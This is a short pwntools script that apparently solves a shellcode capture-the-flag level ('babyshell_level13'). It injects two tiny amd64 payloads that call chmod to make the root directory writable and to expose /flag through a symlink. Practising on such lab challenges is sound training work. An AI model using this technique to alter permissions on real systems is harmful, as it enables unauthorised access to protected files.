#### first chmod / to writable and make ln -s /flag f
#### second chmod f 
import os
from pwn import *
#r = process(['strace','/challenge/babyshell_level13'])
r = process(['/challenge/babyshell_level13'])
context.arch='amd64'
payload = asm(
    '''
    mov al, 90
    push 0x2f
    push rsp
    pop rdi
    push 63
    pop rsi
    syscall
    '''
)

r.send(payload)
r.close()
# os.system('cd /')
# os.system('ln -s /flag f')
r = process(['/challenge/babyshell_level13'])
payload = asm(
    '''
    mov al, 90
    push 0x66
    push rsp
    pop rdi
    push 63
    pop rsi
    syscall
    '''
)

r.send(payload)
r.close()